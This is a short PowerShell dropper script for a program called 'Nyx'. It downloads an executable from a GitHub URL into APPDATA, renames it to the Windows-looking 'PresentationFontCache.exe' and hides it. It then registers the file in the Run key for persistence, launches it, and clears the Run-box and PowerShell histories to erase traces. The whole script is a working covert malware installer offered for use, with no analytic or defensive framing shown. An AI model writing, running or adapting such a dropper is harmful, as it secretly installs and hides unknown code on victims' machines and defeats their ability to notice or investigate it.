# Nyx - WUFHQ56W

# Create folder for Nyx
New-Item -Path "$env:APPDATA" -Name "WUFHQ56W" -ItemType Directory

# Download Nyx
Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/WUFHQ56W/WUFHQ56W.exe -OutFile "$env:APPDATA\WUFHQ56W\WUFHQ56W.exe"

# Change Nyx name
Rename-Item -Path "$env:APPDATA\WUFHQ56W\WUFHQ56W.exe" -NewName "PresentationFontCache.exe"

# Hide Nyx
$FILE=Get-Item "$env:APPDATA\WUFHQ56W\PresentationFontCache.exe" -Force
$FILE.attributes='Hidden'

# Add Nyx to startup processes
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "WUFHQ56W" `
-Value "$env:APPDATA\WUFHQ56W\PresentationFontCache.exe"

# Run Nyx
& "$env:APPDATA\WUFHQ56W\PresentationFontCache.exe"

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
